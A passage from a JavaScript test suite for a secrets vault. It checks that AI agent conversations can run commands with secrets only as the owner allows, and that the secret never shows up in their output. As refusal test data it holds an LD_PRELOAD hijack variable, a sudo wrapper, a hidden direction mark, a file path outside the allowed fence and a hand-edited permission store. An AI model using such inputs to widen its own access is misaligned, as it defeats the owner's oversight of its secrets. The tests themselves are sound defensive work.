  ok(s1.code === 'reveal_needs_password', 'switching ON needs this page\'s 验证是你 window (the second password again) — refused without it', s1);
  ok(openRow(w).open === true && w.door.rowFacts({ id: 'mounts:m1#secretKey' }).open === true, 'with it: ON (the row says so)');
  const own = [['accounts:acct1#apiKey', 'login'], ['channels:lark1#token', 'channel'], ['secrets:host:dev1#token', 'pairing'], ['mounts:m4#session', 'login']];
  const sw = own.map(([id]) => w.door.setRunnable({ id, on: true, reauthed: true }));
  ok(sw.every((x) => x.code === 'entry_has_its_own_door' && /own door/.test(x.words)), 'a LOGIN key, a CHANNEL token, a PAIRING (machine link) token and a sign-in kind on a storage row cannot be switched on — entry_has_its_own_door by name', sw);
  // FORCED 'opened': a store the vault marks, holding the ids anyway (what a bug or a hand would leave)
  const body = JSON.stringify({ v: 1, gen: 99, runnable: ['accounts:acct1#apiKey', 'channels:lark1#token', 'mounts:m1#secretKey', 'mounts:m4#session', 'secrets:host:dev1#token'], always: [] });
  fs.writeFileSync(path.join(w.dataDir, DOOR.STORE_FILE), JSON.stringify({ ...JSON.parse(body), mark: w.vault.macOf(DOOR.MARK_LABEL, body) }));
  const forced = w.mk();
  const refs = [['--env', 'T=vault://accounts/acct1/apiKey'], ['--env', 'T=vault://channels/lark1/token'], ['--env', 'T=vault://secrets/host:dev1/token'], ['--env', 'T=vault://mounts/m4/session']];
  const fr = [];
  for (const e of refs) fr.push(await forced.run({ caller: w.caller, args: [...e, '--', NODE, PRINTER, 'env'], cwd: w.work }));
  ok(fr.every((x) => x.code === 'entry_has_its_own_door' && typeof x.door === 'string' && x.words.includes(x.door)) && !cardsOf(w).length, 'FORCED open: a login / channel / pairing token and a sign-in kind are refused BY NAME at the run, naming their door — no card, nothing ran', fr.map((x) => [x.code, x.door]));
  // the ENGINE'S OWN check: the model's ownDoorOf made to say yes for everything — the door still refuses by its own table
  const keep = VR.ownDoorOf; VR.ownDoorOf = () => null;
  const fr2 = [];
  try { for (const e of refs.slice(0, 3)) fr2.push(await forced.run({ caller: w.caller, args: [...e, '--', NODE, PRINTER, 'env'], cwd: w.work })); } finally { VR.ownDoorOf = keep; }
  ok(fr2.every((x) => x.code === 'entry_has_its_own_door') && Object.keys(DOOR.RUN_CLASS).sort().join() === 'app-secrets,mounts' && ['accounts', 'channels', 'integrations', 'passkeys', 'automation', 'secrets'].every((s) => DOOR.NEVER_CLASS[s]), 'the ENGINE\'s entry-class check alone (the model\'s table made to say yes) still refuses them — two tables say no (RUN_CLASS: storage and app logins only)', fr2.map((x) => x.code));
  // THE MARK: a hand edit of the store (no mark that verifies) reads as EMPTY
  const raw = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
  fs.writeFileSync(path.join(w.dataDir, DOOR.STORE_FILE), JSON.stringify({ ...raw, runnable: [...raw.runnable, 'app-secrets:app1#item.0.1'] }));
  const edited = w.mk();
  const re = await edited.run({ caller: w.caller, args: ENV('env'), cwd: w.work });
  ok(re.code === 'entry_not_runnable' && /vault-run-store-refused/.test(auditOf(w)), 'a HAND-EDITED store (its mark no longer verifies — an agent shares the uid, never the DEK) reads as EMPTY: every entry closed, said in the audit', re.code);
  ok(DOOR.DETAIL_MAX === DETAIL_MAX, 'the card bound is the For-you store\'s own detail bound (a cut card would differ from what runs)');
}

console.log('② THE SCRUB — every form of the value, cut across chunks, on both streams ⇒ 0 bytes reach the agent');
{
  const w = await world();
  openRow(w); openRow(w, 'app-secrets:app1#item.0.1');
  const legs = [
    ['env', ENV('env')],
    ['file', ['--file', 'K=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'file', '$VAULT_FILE{K}']],
    ['file (a reference in $VAULT_FILE)', ['--', NODE, PRINTER, 'file', '$VAULT_FILE{mounts/m1/secretKey}']],
    ['stdin', ['--stdin', 'vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'stdin']],
  ];
  fs.writeFileSync(path.join(w.work, 'tmpl.txt'), 'token=$VAULT{mounts/m1/secretKey}\n');
  legs.push(['template', ['--file', 'CFG=@tmpl.txt', '--', NODE, PRINTER, 'template', '$VAULT_FILE{CFG}']]);
  for (const [name, args] of legs) {
    const { r, card } = await runAnswered(w, args);
    const out = (r.stdout || '') + (r.stderr || '');
    const lk = leaks(out, VALUE);
    ok(r.ok && r.exit === 3 && !lk.length && (out.match(/\[vault:mounts\/m1\/secretKey\]/g) || []).length >= 40 && /DONE/.test(r.stdout) && r.scrubbed.hits >= 40 && r.scrubbed.bytes > 40 * VALUE.length && !!card,
      `${name}: the child printed the value in 21 spellings (the 12 + UTF-16 LE / BE bytes, base32 ×2, quoted-printable, a Python bytes repr, HTML entities, colour escapes, wrapped base64), each cut across two chunks on stdout AND stderr at once (the other pipe's half between them) — the oracle finds NOTHING (0 bytes; the whole percent line lower-cased changes the value's own letters — a case swap, never masked, never the value), ${r.scrubbed && r.scrubbed.hits} placeholders, ${r.scrubbed && r.scrubbed.bytes} bytes scrubbed; the exit code (3) passes`, { lk, code: r.code, exit: r.exit, out: out.slice(0, 400) });
    if (name === 'file') {
      const m = /FILE (\d+) (\d+) (\S+)/.exec(r.stdout || '');
      ok(m && m[1] === '600' && m[2] === '700' && m[3].startsWith(w.runRoot + '/' + DOOR.RUN_DIR_PREFIX) && !fs.existsSync(m[3]) && !runDirs(w).length, 'the file is 0600 in a 0700 run folder under the run root — and the folder is SHREDDED and gone once the child is', m && m.slice(1));
    }
  }
  ok(!runDirs(w).length, 'no run folder is left after five runs');
  const big = await runAnswered(w, ENV('big'));
  ok(big.r.ok && big.r.truncated === true && Buffer.byteLength(big.r.stdout) <= VR.OUTPUT_MAX_BYTES && !leaks(big.r.stdout.slice(-200), VALUE).length, 'the output is cut at 2 MiB (said: truncated) — the value printed past the cut never arrives', { truncated: big.r.truncated, len: big.r.stdout && big.r.stdout.length });
  const edge = await runAnswered(w, ENV('edge'));
  const tail = (edge.r.stdout || '').slice(-400);
  ok(edge.r.ok && edge.r.truncated === true && !leaks(tail, VALUE).length && !tail.includes(VALUE.slice(0, 12)) && !tail.includes(VALUE.slice(0, 6)), 'a value printed ACROSS the 2 MiB cut: its first 12 bytes are inside the bound — the scrubber\'s held tail is DROPPED at a cut, never flushed (not even 6 bytes of it arrive)', { truncated: edge.r.truncated, tail: tail.slice(-60) });
  // ONE WINDOW PER RUN (the desk's q-043 M1): the run's ONE scrubber reads both pipes in arrival order
  const sp = await splitLeg(w);
  ok(sp.ok && sp.so === '<' + PH1 + ' tail\n' && sp.se === PH1 + '>\n' && !sp.lk.length, 'ONE WINDOW PER RUN: the child printed half the value on stdout and the rest on stderr — the run\'s one scrubber saw it whole: stdout «<[vault:…] tail», stderr «[vault:…]>» (each pipe shows where its part was), 0 bytes of it', sp);
  for (const [mode, what, dec] of [['edge2', 'its HTML entities (~200 characters, 60 inside the bound)', (s) => s.replace(/&#(\d+);/g, (m, d) => String.fromCodePoint(+d))], ['edge3', 'its UTF-16LE bytes (40 inside the bound)', (s) => s.replace(/\0/g, '')]]) {
    const e2 = await runAnswered(w, ENV(mode));
    const t2 = (e2.r.stdout || '').slice(-1200), d2 = dec(t2);
    ok(e2.r.ok && e2.r.truncated === true && !leaks(t2, VALUE).length && !d2.includes(VALUE.slice(0, 6)) && t2.endsWith('[vault:\u2026]'), `a value printed ACROSS the 2 MiB cut as ${what}: round 21 («never drop a byte») — the held tail (the window where a value is HALF present in that VIEW) is FLUSHED as ONE placeholder [vault:…] (not dropped silently, not half a value), not even 6 characters of it arrive`, { truncated: e2.r.truncated, tailDropped: e2.r.tailDropped, tail: JSON.stringify(t2.slice(-80)) });
  }
  const app = await runAnswered(w, ['--env', 'T=vault://app-secrets/app1/item.0.1', '--', NODE, PRINTER, 'env']);
  ok(app.r.ok && !leaks(app.r.stdout + app.r.stderr, VALUE2).length && /\[vault:app-secrets\/app1\/item\.0\.1\]/.test(app.r.stdout), 'an app login opened for runs: the same — its placeholder, 0 bytes of it', app.r.code);
  // the refusals — each BY NAME, before anything is read or spawned
  openRow(w, 'mounts:m2#secretKey');
  const REF = [
    [['--', NODE, PRINTER, 'env', 'vault://mounts/m1/secretKey'], 'argv_refused', 'a value on the command line (/proc/<pid>/cmdline)'],
    [['--env', 'T=vault://mounts/m1/secretKey', '--', 'cat', '/etc/hostname'], 'tool_prints_secrets', 'a print tool (cat)'],
    [['--env', 'T=vault://mounts/m1/secretKey', '--', 'sudo', 'true'], 'tool_wraps_another', 'a wrapper (sudo)'],
    [['--env', 'T=vault://mounts/m2/secretKey', '--', NODE, PRINTER, 'env'], 'entry_too_short_to_mask', 'a value under 8 bytes (it could not be scrubbed)'],
    [['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'env\u202e'], 'hidden_chars', 'a direction mark in the command (the card would show another order)'],
    [['--env', 'T=vault://mounts/m1/secretKey', '--', 'no-such-tool-vrd'], 'tool_not_found', 'a program not on the PATH (a bare name is never looked up in the cwd)'],
    [['--env', 'T=vault://mounts/m1/secretKey', '--on', 'mac', '--', NODE, PRINTER, 'env'], 'device_road_later', '--on a machine (P1 vault-run-device)'],
    [['--env', 'LD_PRELOAD=/tmp/x.so', '--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'env'], 'env_refused', 'a hijack env name (LD_PRELOAD)'],
    [['--file', 'CFG=@/etc/hostname', '--', NODE, PRINTER, 'template', '$VAULT_FILE{CFG}'], 'template_refused', 'a template outside the project / temp / Downloads fence'],
    [['--env', 'T=vault://mounts/m9/secretKey', '--', NODE, PRINTER, 'env'], 'entry_unknown', 'an entry that is not there'],
  ];
  const before = cardsOf(w).length;
  const got = [];
  for (const [args, code] of REF) got.push((await w.door.run({ caller: w.caller, args, cwd: w.work })).code);
  ok(REF.every(([, code], i) => got[i] === code) && cardsOf(w).length === before, `refused BY NAME, no card, nothing spawned: ${REF.map(([, c, why], i) => `${why} ⇒ ${got[i]}`).join(' · ')}`, got);
  // round 17 (item 1): a template within the card render bound is shown IN FULL — TWO such templates together overflow DETAIL_MAX ⇒ card_too_long (a single over-bound template is now a short note, below)
  fs.writeFileSync(path.join(w.work, 'long1.txt'), 'x'.repeat(3900) + '$VAULT{mounts/m1/secretKey}');
  fs.writeFileSync(path.join(w.work, 'long2.txt'), 'y'.repeat(3900) + '$VAULT{mounts/m1/secretKey}');
  const cut = await w.door.run({ caller: w.caller, args: ['--file', 'C1=@long1.txt', '--file', 'C2=@long2.txt', '--', NODE, PRINTER, 'template', '$VAULT_FILE{C1}', '$VAULT_FILE{C2}'], cwd: w.work });
  const job = await w.door.run({ caller: { job: true, name: 'nightly' }, args: ENV('env'), cwd: w.work });
  const remote = await w.door.run({ caller: { ...w.caller, remote: true }, args: ENV('env'), cwd: w.work });
  const fence = await w.door.run({ caller: w.caller, args: ENV('env'), cwd: '/etc' });
  ok(cut.code === 'card_too_long' && job.code === 'job_no_use' && remote.code === 'device_road_later' && fence.code === 'cwd_refused', 'a card that would be cut ⇒ card_too_long · a Background Work job ⇒ job_no_use · a conversation on a paired machine ⇒ device_road_later · a cwd outside the fence ⇒ cwd_refused', [cut.code, job.code, remote.code, fence.code]);
}

console.log('②b AN AGENT\'S OWN ENTRY (vault-mint-put\'s mint / put) — opened by the owner, used by its conversation only');
{
  const w = await world();
  const id = 'secrets:agent:conv-1/gh-token#secret';
  ok(w.door.rowFacts({ id }).can === false && w.door.rowFacts({ id }).own === true, 'lane vault-agent-own: the Vault window\'s row of an agent\'s own entry carries NO switch — its conversation runs it by construction, no other may');
  const r0 = await w.door.run({ caller: w.caller, args: ['--env', 'T=vault://agent:conv-1/gh-token', '--', NODE, PRINTER, 'env'], cwd: w.work });
  ok(r0.ok && r0.by === 'own' && !cardsOf(w).length, 'lane vault-agent-own: never opened, never granted ⇒ ITS conversation runs it with no card (was entry_not_runnable — decision ⑤ no longer holds for an entry it stored itself)', r0.code || r0.by);
  const own = await runAnswered(w, ['--env', 'T=vault://agent:conv-1/gh-token', '--', NODE, PRINTER, 'env']);
  ok(own.r.ok && !leaks(own.r.stdout + own.r.stderr, 'agent-minted-value-0123456789').length && /\[vault:agent:conv-1\/gh-token\]/.test(own.r.stdout), 'ITS conversation runs with it, spelled as mint hands it out — scrubbed to [vault:agent:conv-1/gh-token]', own.r.code);
  const other = await w.door.run({ caller: { ...w.caller, conversationId: 'conv-2', sessionKey: 'claude:conv-2', name: 'Lane Y' }, args: ['--env', 'T=vault://agent:conv-1/gh-token', '--', NODE, PRINTER, 'env'], cwd: w.work });
  ok(other.code === 'use_not_granted' && !cardsOf(w).length, 'ANOTHER conversation ⇒ use_not_granted, by name — no card, nothing read', other.code);
}

console.log('②c B-bc3b — the owner SHARES an agent\'s own entry through its grant row («Who may use it…»): another conversation runs it ONLY as the row says');
{
  const VUG = R('src/server/vault-use-grants.js'), GS = R('src/server/grants-store.js');
  const ID = 'secrets:agent:conv-1/gh-token#secret', REF = 'vault://agent:conv-1/gh-token';
  async function shareWorld(doorMod = DOOR, { askMs = 50, now = null } = {}) {   // `now`: ONE clock for the door and the grants (the expired-window leg)
    const w = await world({ doorMod, askMs });   // the read: a mutant that lets a card through ends it in 50 ms, never the real 60 s
    const gs = GS.create({ memory: true }), groups = new Map();
    const ug = VUG.create({ grants: () => gs, vault: w.vault, dataDir: w.dataDir, log: (m) => w.logs.push(String(m)), ...(now ? { now } : {}) });
    const door = w.mk(doorMod, { useGrants: ug, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: groups.get(c.conversationId) || [] }), ...(now ? { now } : {}) });
    const as = (cid) => ({ ...w.caller, conversationId: cid, sessionKey: `claude:${cid}`, name: `Lane ${cid}` });
    const runAs = (cid, args) => door.run({ caller: as(cid), args, cwd: w.work });
    return { w, ug, groups, door, as, runAs };
  }
  const TO = (host) => ['--env', `T=${REF}`, '--', 'curl', '-s', `https://${host}/v1/items`];
  const s = await shareWorld();
  const f0 = s.door.rowFacts({ id: ID });
  ok(f0.own === true && f0.can === false && f0.use && f0.use.own === true && !(f0.use.to || []).length, 'the agent\'s row carries its `use` with NO member — the window draws «Who may use it…» on it (the owner shares it there); still no switch', f0);
  const before = await s.runAs('conv-2', TO('api.example.com'));
  ok(before.code === 'use_not_granted' && !cardsOf(s.w).length, 'NOT shared ⇒ another conversation is refused use_not_granted, by name — no card (as before)', before.code);
  const add = s.ug.addMember(ID, { kind: 'conversation', key: 'conv-2', name: 'Lane conv-2' }, { hosts: ['api.example.com'] });
  const shared = await s.runAs('conv-2', TO('api.example.com'));
  ok(add && add.ok && shared.ok && shared.by === 'grant' && !cardsOf(s.w).length && !leaks(shared.stdout + shared.stderr, 'agent-minted-value-0123456789').length,
    'SHARED with conv-2 for api.example.com ⇒ conv-2 runs it there BY THE GRANT, no card — the value scrubbed from what comes back', { add: add && add.ok, ok: shared.ok, by: shared.by, code: shared.code });
  const away = await s.runAs('conv-2', TO('elsewhere.example.test'));
  const blind = await s.runAs('conv-2', ['--env', `T=${REF}`, '--', NODE, PRINTER, 'env']);
  const third = await s.runAs('conv-3', TO('api.example.com'));
  ok(away.code === 'use_not_granted' && blind.code === 'use_not_granted' && third.code === 'use_not_granted' && !cardsOf(s.w).length,
    '…ONLY as the row says: another host, a command whose destination cannot be told, a conversation the row does not name ⇒ use_not_granted, no card (what an agent stored never reaches anyone by a card)', { away: away.code, blind: blind.code, third: third.code });
  const own = await s.runAs('conv-1', TO('api.example.com'));
  ok(own.ok && own.by === 'own', 'its own conversation still runs it by construction (own)', own.code || own.by);
  const l2 = s.door.runnableFor(s.as('conv-2')), l3 = s.door.runnableFor(s.as('conv-3'));
  const e2 = (l2.entries || []).find((x) => x.ref === REF);
  ok(e2 && e2.by === 'standing' && !e2.paused && (e2.hosts || []).includes('api.example.com') && !(l3.entries || []).some((x) => x.ref === REF), 'the list: conv-2 SEES the shared entry (standing, its hosts — not «paused»: no switch is its), conv-3 does not', { e2, l3: (l3.entries || []).map((x) => x.ref) });
  s.groups.set('conv-4', ['g-team']);
  s.ug.addMember(ID, { kind: 'group', id: 'g-team', name: 'Team' }, { hosts: ['api.example.com'] });
  const viaGroup = await s.runAs('conv-4', TO('api.example.com'));
  ok(viaGroup.ok && viaGroup.by === 'grant', 'shared with a Task Group ⇒ its member conv-4 runs it for the row\'s host', viaGroup.code || viaGroup.by);
  // the read (r1): a MIXED run — the shared entry + a free entry the owner switched ON but granted conv-2 nothing for — never draws
  // a card (an «Always» there would write conv-2 a member the owner never gave). B-bc3b (the cure): each entry by ITS OWN rule —
  // the free entry has no standing grant for conv-2, so IT is the one named (run_not_admitted), never the shared one it was before
  s.door.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true });
  const MIXED = ['--env', `T=${REF}`, '--env', 'U=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/items'];
  const mixed = await s.runAs('conv-2', MIXED);
  ok(mixed.code === 'run_not_admitted' && mixed.ref === 'vault://mounts/m1/secretKey' && /^«vault:\/\/mounts\/m1\/secretKey» is not admitted in this run: no standing approval of the user's lets this conversation use it for api\.example\.com \(an approval of a request — once or for 8 hours — or a pasted one is not read in a run that names a shared entry\)\. /.test(mixed.words || '') && !cardsOf(s.w).length,
    'a MIXED run naming the shared entry (+ a free entry with no grant for conv-2) ⇒ run_not_admitted naming the FREE entry (the one not admitted) and why, NO card — a card there could widen the share', { code: mixed.code, ref: mixed.ref, words: mixed.words, cards: cardsOf(s.w).length });
  // B-bc3b (the cure, 主开发 r840) — THE CALLER'S OWN ENTRY + A SHARED ONE: each admitted by its own rule (ownership · the grant row)
  const OWN_ROWS = [{ entry: 'agent:conv-2/own-put', field: 'secret', label: 'Agent secret · own-put', bytes: 30, v: 'conv2-put-value-0123456789ab' },
    { entry: 'agent:conv-2/own-mint', field: 'secret', label: 'Agent secret · own-mint', bytes: 30, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane conv-2', forHost: 'own.example.test' }, v: 'conv2-mint-value-0123456789ab' },
    { entry: 'agent:conv-2/own-here', field: 'secret', label: 'Agent secret · own-here', bytes: 30, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane conv-2', forHost: 'api.example.com' }, v: 'conv2-here-value-0123456789ab' }];
  ROWS.secrets.push(...OWN_ROWS);
  try {
    const ownSolo = await s.runAs('conv-2', ['--env', 'U=vault://agent:conv-2/own-put', '--', 'curl', '-s', 'https://api.example.com/v1/items']);
    ok(ownSolo.ok && ownSolo.by === 'own', 'the plant proves itself: conv-2\'s OWN put entry runs alone by ownership (own), the shared entry alone by its grant (above)', ownSolo.code || ownSolo.by);
    const OWNMIX = ['--env', `T=${REF}`, '--env', 'U=vault://agent:conv-2/own-put', '--', 'curl', '-s', 'https://api.example.com/v1/items'];
    const om = await s.runAs('conv-2', OWNMIX);
    ok(om.ok && om.by === 'grant' && !cardsOf(s.w).length && !leaks((om.stdout || '') + (om.stderr || ''), 'agent-minted-value-0123456789').length && !leaks((om.stdout || '') + (om.stderr || ''), 'conv2-put-value-0123456789ab').length,
      'B-bc3b (the cure): its OWN put entry + the entry SHARED with it, to the shared row\'s host ⇒ RUNS by:grant with NO card (each admitted by its own rule) — neither value in what comes back (the release refused it naming the shared entry)', { ok: om.ok, by: om.by, code: om.code, words: om.words });
    const mintAway = await s.runAs('conv-2', ['--env', `T=${REF}`, '--env', 'U=vault://agent:conv-2/own-mint', '--', 'curl', '-s', 'https://api.example.com/v1/items']);
    ok(mintAway.code === 'run_not_admitted' && mintAway.ref === 'vault://agent:conv-2/own-mint' && /minted for own\.example\.test and this run goes to api\.example\.com/.test(mintAway.words || '') && !cardsOf(s.w).length,
      'its OWN value minted for another host + the shared entry ⇒ run_not_admitted naming the OWN entry (its own road would draw its card; a run naming a shared entry never does), NO card', { code: mintAway.code, ref: mintAway.ref, words: mintAway.words });
    const mintHere = await s.runAs('conv-2', ['--env', `T=${REF}`, '--env', 'U=vault://agent:conv-2/own-here', '--', 'curl', '-s', 'https://api.example.com/v1/items']);
    ok(mintHere.ok && mintHere.by === 'grant' && !cardsOf(s.w).length, 'its OWN value minted FOR this run\'s host + the shared entry ⇒ runs by:grant, no card (its own road admits it where it was minted for)', { ok: mintHere.ok, by: mintHere.by, code: mintHere.code, words: mintHere.words });
    // a THIRD kind beside them — the owner's entry, ON, with a STANDING grant for conv-2 to the same host — is admitted by that grant
    const m1g = s.ug.addMember('mounts:m1#secretKey', { kind: 'conversation', key: 'conv-2', name: 'Lane conv-2' }, { hosts: ['api.example.com'] });
    const three = await s.runAs('conv-2', [...OWNMIX.slice(0, 4), '--env', 'V=vault://mounts/m1/secretKey', ...OWNMIX.slice(4)]);
    const tl = runLines(s.w).pop() || {};
    ok(m1g && m1g.ok && three.ok && three.by === 'grant' && (tl.grants || []).length === 2 && !cardsOf(s.w).length && !leaks((three.stdout || '') + (three.stderr || ''), VALUE).length,
      'shared + its OWN put entry + the owner\'s entry under a STANDING grant for conv-2 ⇒ runs by:grant, no card — the run line names the TWO grants (the shared row\'s, the owner\'s entry\'s); the own entry needs none', { ok: three.ok, by: three.by, code: three.code, grants: tl.grants });
    // the 1-hour WINDOW still says itself in a mixed run, and ENDS there with its hour (its own world: ②c's cards end in 50 ms by
    // design; ONE clock for the door and the grants, so the hour's end is reached by the clock, never by waiting)
    const bounded = (p, ms, why) => { let t = null; return Promise.race([p, new Promise((res) => { t = setTimeout(() => res({ ok: false, code: why }), ms); })]).finally(() => clearTimeout(t)); };   // a bound whose timer is CLEARED: a leg that passed leaves nothing pending
    const MIX3 = [...OWNMIX.slice(0, 4), '--env', 'V=vault://mounts/m1/secretKey', ...OWNMIX.slice(4)];
    async function windowMix(doorMod) {
      let clk = Date.now();
      const hw = await shareWorld(doorMod, { askMs: null, now: () => clk });
      hw.ug.addMember(ID, { kind: 'conversation', key: 'conv-2', name: 'Lane conv-2' }, { hosts: ['api.example.com'] });
      hw.door.setRunnable({ id: 'mounts:m1#secretKey', on: true, reauthed: true });
      const M1RUN = ['--env', 'V=vault://mounts/m1/secretKey', '--', '/bin/sh', '-c', 'true'];   // a card that offers NO «Always» is the one that offers «Allow for 1 hour» (the door's winWould) — a shell's
      const p = hw.door.run({ caller: hw.as('conv-2'), args: M1RUN, cwd: hw.w.work });
      const c = await waitCard(hw.w);
      const ans = c ? hw.door.answer(c.action.askId, { answer: 'window', reauthed: true, person: true }) : null;
      const first = await bounded(p, 5000, 'the card was never settled (5 s)');   // a bound: a card left waiting is a red by name, never a hang
      const mixW = await bounded(hw.runAs('conv-2', MIX3), 5000, 'the mixed run never settled (5 s)');
      const wl = runLines(hw.w).pop() || {};
      const notice = !!mixW.receipt && hw.w.logs.some((l) => l.includes(`a run under the 1-hour approval (${mixW.receipt})`));   // no client in the world: the window's one notice per use is its log line
      clk += R('src/vault-use-grant.js').WINDOW_MS + 1000;   // past the hour's end (the PURE grant's own length), by the one clock
      const late = await bounded(hw.runAs('conv-2', MIX3), 5000, 'the late run never settled (5 s)');
      const cardsLate = cardsOf(hw.w).length;
      for (const x of cardsOf(hw.w)) { try { hw.door.answer(x.action.askId, { answer: 'deny', reauthed: true, person: true }); } catch { } }   // a red's card is closed here: its run never outlives the leg by the real 60 s
      return { card: !!c, answered: !!(ans && ans.ok), first, mixW, wl, notice, late, cardsLate };
    }
    {
      const r = await windowMix(DOOR);
      ok(r.card && r.first.ok && r.mixW.ok && r.mixW.by === 'grant' && r.wl.receipt === r.mixW.receipt && r.wl.scope === 'window' && Number(r.wl.windowLeft) === 60 && r.notice, 'shared + own + the owner\'s entry under its 1-HOUR WINDOW ⇒ runs, its OWN run line says scope «window» with the minutes left (60 on the one clock), and the window\'s one notice per use is said (kept in a mixed run)', { card: r.card, answered: r.answered, first: r.first.ok && r.first.by, mix: r.mixW.ok && r.mixW.by, code: r.mixW.code, receipt: r.mixW.receipt, line: r.wl.receipt, scope: r.wl.scope, left: r.wl.windowLeft, notice: r.notice });
      ok(r.late.code === 'run_not_admitted' && r.late.ref === 'vault://mounts/m1/secretKey' && /is not admitted in this run: no standing approval of the user's/.test(r.late.words || '') && r.cardsLate === 0,
        'the same mixed run AFTER the hour (the one clock past its end) ⇒ run_not_admitted naming the owner\'s entry, no card — the window ends in a mixed run as it does alone', { code: r.late.code, ref: r.late.ref, words: r.late.words, cards: r.cardsLate });
      // RED — the mixed block's window lines taken away: the same mixed run still runs by:grant (the plant proves itself) but its
      // run line no longer says «window» — the leg above goes red there
      const SRCw = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
      const noWin = M.load('src/server/vault-run-door.js', anchored(SRCw, '        if (winsM.length) {', '        if (false) {', 'test-vault-run ②c bc3b-no-window'), 'bc3b-no-window');
      const rw = noWin ? await windowMix(noWin) : null;
      ok(!!noWin && rw && rw.first.ok && rw.mixW.ok && rw.mixW.by === 'grant' && rw.wl.receipt === rw.mixW.receipt && rw.wl.scope !== 'window' && !rw.notice, 'RED — the mixed block\'s window lines off: the mixed run under the window still RUNS by:grant (the plant is where it claims) but its OWN run line says no «window» and no notice is said — the window leg goes red there', rw && { first: rw.first.ok, mix: rw.mixW.ok && rw.mixW.by, line: rw.wl.receipt === rw.mixW.receipt, scope: rw.wl.scope, notice: rw.notice });
    }
    // RED — the release's rule (a run naming a shared entry is refused, naming the shared entry, whenever the verdict asks)
    const SRCm = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const oldRule = M.load('src/server/vault-run-door.js', anchored(SRCm, '        const r0 = spec.refs.find((r) => whyNot(r) !== null);', "        const r0 = spec.refs.find((r) => sharedIds.has(r.id)); if (r0) { note('use_not_granted', { ...head, ref: r0.ref }); return named('use_not_granted', { ref: r0.ref }); }", 'test-vault-run ②c bc3b-old-rule'), 'bc3b-old-rule');
    let ro = null;
    if (oldRule) { const m = await shareWorld(oldRule); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] }); const solo = await m.runAs('conv-2', TO('api.example.com')); const x = await m.runAs('conv-2', OWNMIX); ro = { solo: solo.ok && solo.by, code: x.code, ref: x.ref }; }
    ok(!!oldRule && ro && ro.solo === 'grant' && ro.code === 'use_not_granted' && ro.ref === REF, 'RED — the release\'s rule (the patched copy\'s plant proves itself: its shared run alone still runs by:grant): the OWN + SHARED run is refused naming the SHARED entry — the cure\'s leg above goes red there', ro);
    // RED — the own road's MINTED rule taken away (every own entry admitted by ownership alone): its value minted for another
    // host RUNS beside the shared entry — the mintAway leg above goes red there
    const SRCo = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const ownAll = M.load('src/server/vault-run-door.js', anchored(SRCo, '          if (ownIds.has(r.id)) {', '          if (ownIds.has(r.id)) { return null;', 'test-vault-run ②c bc3b-own-all'), 'bc3b-own-all');
    let oa = null;
    if (ownAll) { const m = await shareWorld(ownAll); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] }); const solo = await m.runAs('conv-2', TO('api.example.com')); const x = await m.runAs('conv-2', ['--env', `T=${REF}`, '--env', 'U=vault://agent:conv-2/own-mint', '--', 'curl', '-s', 'https://api.example.com/v1/items']); oa = { solo: solo.ok && solo.by, run: x.ok ? x.by : x.code }; }
    ok(!!ownAll && oa && oa.solo === 'grant' && oa.run === 'grant', 'RED — the own road\'s minted rule off (the copy\'s shared run alone still runs by:grant): the OWN value minted for own.example.test RUNS to api.example.com beside the shared entry — the mintAway leg goes red there', oa);
    // THE FAIL-CLOSED ARM (a belt: runVerdict names `away` on both of its asks, so only a verdict with no hosts reaches it): a copy
    // whose verdict reads as naming none ⇒ the caller's own entry is NOT admitted («its own road could not be judged») — and its
    // RED, the same copy with the belt taken away ⇒ an own value minted for another host is admitted blind
    const SRCb = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const BLIND = ['        const awayKnown = Array.isArray(verdict.away),', '        const awayKnown = Array.isArray(verdict.awayNamedNone),', 'test-vault-run ②c bc3b-blind'];
    const blindV = M.load('src/server/vault-run-door.js', anchored(SRCb, ...BLIND), 'bc3b-blind');
    const blindNoBelt = M.load('src/server/vault-run-door.js', anchored(anchored(SRCb, ...BLIND), "            if (!awayKnown) return 'its own road could not be judged in this run';", '', 'test-vault-run ②c bc3b-blind (belt)'), 'bc3b-blind-nobelt');
    const blindRun = async (mod) => { const m = await shareWorld(mod); m.ug.addMember(ID, { kind: 'conversation', key: 'conv-2' }, { hosts: ['api.example.com'] }); const solo = await m.runAs('conv-2', TO('api.example.com')); const x = await m.runAs('conv-2', ['--env', `T=${REF}`, '--env', 'U=vault://agent:conv-2/own-mint', '--', 'curl', '-s', 'https://api.example.com/v1/items']); return { solo: solo.ok && solo.by, run: x.ok ? x.by : x.code, ref: x.ref, words: x.words, cards: cardsOf(m.w).length }; };
    const bv = blindV ? await blindRun(blindV) : null, bn = blindNoBelt ? await blindRun(blindNoBelt) : null;
    ok(!!blindV && bv && bv.solo === 'grant' && bv.run === 'run_not_admitted' && bv.ref === 'vault://agent:conv-2/own-mint' && /its own road could not be judged in this run/.test(bv.words || '') && bv.cards === 0,
      'the fail-closed arm: a verdict naming no hosts (a copy; the shared run alone still runs by:grant) ⇒ the OWN entry is not admitted («its own road could not be judged»), no card', bv);
    ok(!!blindNoBelt && bn && bn.solo === 'grant' && bn.run === 'grant', 'RED — the same blind copy with the belt taken away: the own value minted for another host RUNS by:grant — the fail-closed leg goes red there', bn);
  } finally { for (const x of OWN_ROWS) ROWS.secrets.splice(ROWS.secrets.indexOf(x), 1); }
  // B-bc3b (the row's missing leg) — `&& !refused` on a SHARED entry: a store that fails its mark closes it too. The store is read
